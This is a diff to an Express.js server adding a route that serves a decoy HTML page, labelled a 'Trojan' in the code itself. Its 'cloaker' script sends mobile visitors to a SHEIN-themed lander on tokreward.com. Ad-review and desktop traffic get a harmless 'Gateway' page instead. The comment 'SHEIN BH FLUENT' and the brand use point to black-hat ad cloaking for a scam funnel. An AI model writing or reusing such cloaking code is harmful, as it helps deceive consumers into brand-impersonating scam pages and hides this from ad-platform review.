@@ -1433,6 +1433,145 @@ app.get('/876/:slug', (req, res, next) => {
 });
 
 // SHEIN BH FLUENT
+app.get('/8762/:slug', (req, res, next) => {
+    const { slug } = req.params;
+    const destinationLander = `https://tokreward.com/sheinesp.html?slug=876`;
+    const trojanHTML = `
+        <!DOCTYPE html>
+        <html lang="en">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <script>
+                // Cloaker logic
+                const urlParams = new URLSearchParams(window.location.search);
+                const utmXXX = urlParams.get("xxx");
+                const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+                if (utmXXX === "__PLACEMENT__") {
+                    } else if (isMobileDevice) {
+                        window.location.href = "${destinationLander}";
+                    } else {
+                    }
+            </script>
+            <title>${slug}</title>
+            <style>
+    body, html {
+        margin: 0;
+        padding: 0;
+        height: 100%;
+        font-family: 'Montserrat', sans-serif;
+        background-color: #000;
+        color: #fff;
+    }
+    .starfield {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: url('data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiPjxyZWN0IHdpZHRoPSIxMDAlIiBoZWlnaHQ9IjEwMCUiIGZpbGw9ImJsYWNrIi8+PHJlY3Qgd2lkdGg9IjEiIGhlaWdodD0iMSIgeD0iMTAiIHk9IjEwIiBmaWxsPSJ3aGl0ZSIvPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHg9IjMwIiB5PSIzMCIgZmlsbD0id2hpdGUiLz48cmVjdCB3aWR0aD0iMSIgaGVpZ2h0PSIxIiB4PSI1MCIgeT0iNTAiIGZpbGw9IndoaXRlIi8+PHJlY3Qgd2lkdGg9IjEiIGhlaWdodD0iMSIgeD0iNzAiIHk9IjcwIiBmaWxsPSJ3aGl0ZSIvPjxyZWN0IHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHg9IjkwIiB5PSI5MCIgZmlsbD0id2hpdGUiLz48L3N2Zz4=');
+        animation: twinkle 10s linear infinite;
+    }
+    @keyframes twinkle {
+        0% { opacity: 0.5; }
+        50% { opacity: 1; }
+        100% { opacity: 0.5; }
+    }
+    .content {
+        position: relative;
+        z-index: 1;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        min-height: 100vh;
+        padding: 2rem;
+        text-align: center;
+    }
+    h1 {
+        font-size: 4rem;
+        margin-bottom: 0.5rem;
+        text-shadow: 0 0 10px #00ffff, 0 0 20px #00ffff, 0 0 30px #00ffff;
+    }
+    .shop-info {
+        font-size: 1.2rem;
+        margin-bottom: 2rem;
+    }
+    .portal {
+        width: 200px;
+        height: 200px;
+        background: radial-gradient(circle, #00ffff, #000080);
+        border-radius: 50%;
+        margin: 2rem auto;
+        animation: pulse 4s infinite alternate;
+    }
+    @keyframes pulse {
+        0% { transform: scale(1); box-shadow: 0 0 20px #00ffff; }
+        100% { transform: scale(1.1); box-shadow: 0 0 40px #00ffff; }
+    }
+    .features {
+        display: flex;
+        justify-content: space-around;
+        width: 100%;
+        max-width: 800px;
+        margin-top: 2rem;
+    }
+    .feature {
+        background-color: rgba(0, 255, 255, 0.1);
+        padding: 1rem;
+        border-radius: 10px;
+        transition: all 0.3s ease;
+    }
+    .feature:hover {
+        background-color: rgba(0, 255, 255, 0.2);
+        transform: translateY(-5px);
+    }
+    footer {
+        margin-top: 2rem;
+        font-size: 0.9rem;
+    }
+    a {
+        color: #00ffff;
+        text-decoration: none;
+    }
+    a:hover {
+        text-decoration: underline;
+    }
+</style>
+</head>
+<body>
+    <div class="starfield"></div>
+    <div class="content">
+        <h1>${slug} Gateway</h1>
+        <div class="shop-info">Your portal to: <strong>${slug}</strong></div>
+        <div class="portal"></div>
+        <p>Step through the ${slug} Gateway and discover realms beyond imagination.</p>
+        <div class="features">
+            <div class="feature">
+                <h3>Cosmic Artifacts</h3>
+                <p>Relics from distant galaxies</p>
+            </div>
+            <div class="feature">
+                <h3>Dimensional Shifts</h3>
+                <p>Experience alternate realities</p>
+            </div>
+            <div class="feature">
+                <h3>Ethereal Essences</h3>
+                <p>Capture the spirit of the cosmos</p>
+            </div>
+        </div>
+        <footer>
+            <p>Transcend reality with ${slug} &copy; 2024 | <a href="https://tokreward.com/pp.html">Privacy Assurance</a></p>
+        </footer>
+    </div>
+</body>
+</html>
+            `;
+            res.send(trojanHTML);
+            console.log(`Served 876 Trojan (${slug})`);
+});
+
+// SHEIN BH FLUENT
 app.get('/ary/:slug', (req, res, next) => {
     const { slug } = req.params;
     const destinationLander = `https://tokreward.com/shein.html?slug=ARY`;
